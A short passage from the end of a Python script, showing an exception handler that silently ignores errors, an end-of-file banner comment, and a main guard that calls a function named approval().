        except Exception as e:
                 pass

#________________| END |________________#
if __name__=='__main__':
         approval()
